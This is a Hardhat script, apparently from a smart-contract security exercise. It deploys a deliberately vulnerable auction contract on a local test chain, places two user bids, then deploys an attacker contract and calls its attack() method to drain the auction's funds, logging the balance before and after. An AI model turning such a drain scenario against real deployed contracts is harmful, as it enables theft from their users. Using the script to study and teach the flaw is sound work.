require("@nomiclabs/hardhat-ethers");
const { ethers } = require("hardhat");

async function preMine(blockNumber) {
    await ethers.provider.send("evm_setAutomine", [false]);
    await ethers.provider.send("evm_setIntervalMining", [0]);

    blockNumber = "0x" + blockNumber.toString(16)
    await ethers.provider.send("hardhat_mine", [blockNumber]);
    // re-enable auto-mining when you are done, so you dont need to manually mine future blocks
    await ethers.provider.send("evm_setAutomine", [true]);
}

async function scenario() {
    [owner, user1, user2, user3, user4, user5] = await ethers.getSigners();

    await preMine(1)

    // 1. Deploy AuctionReallyBad.sol
    let auctionFactory = await ethers.getContractFactory("AuctionRB")
    let auction = await auctionFactory.connect(owner).deploy()
    await auction.deployed()

    // 2. Bid as user 1
    let bidAmount = ethers.utils.parseEther("1")
    let bidTx = await auction.connect(user1).bid(
        {value: bidAmount}
    )
    await bidTx.wait()
    let bidInfo = await auction.bidInfo(user1.address)
    console.log("User 1 has bid: ", ethers.utils.formatEther(bidInfo))

    // 3. Outbid user 1 as user 2
    bidAmount = ethers.utils.parseEther("2")
    bidTx = await auction.connect(user2).bid(
        {value: bidAmount}
    )
    await bidTx.wait()
    bidInfo = await auction.bidInfo(user2.address)
    console.log("User 2 has bid: ", ethers.utils.formatEther(bidInfo))

    // 4. Create an Attacker smart contract that is able
    // to withdraw all the funds from AuctionReallyBad

    // 5. Deploy Attacker
    let attackerFactory = await ethers.getContractFactory("AuctionRBAttacker")
    let attacker = await attackerFactory.connect(user5).deploy(auction.address)
    await attacker.deployed()

    // 6. Bid as attacker
    bidTx = await attacker.connect(user5).bid({
        value: ethers.utils.parseEther("0.5")
    })
    await bidTx.wait()
    bidInfo = await auction.bidInfo(attacker.address)
    console.log("Attacker smart contract has bid: ", ethers.utils.formatEther(bidInfo))

    // 7. Call the attack() method and withdraw all the funds
    let attackerBalance = ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))
    console.log("Balance before: ", attackerBalance)
    let attackTx = await attacker.connect(user5).attack()
    await attackTx.wait()
    attackerBalance = ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))
    console.log("Balance after: ", attackerBalance)
}


scenario()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    });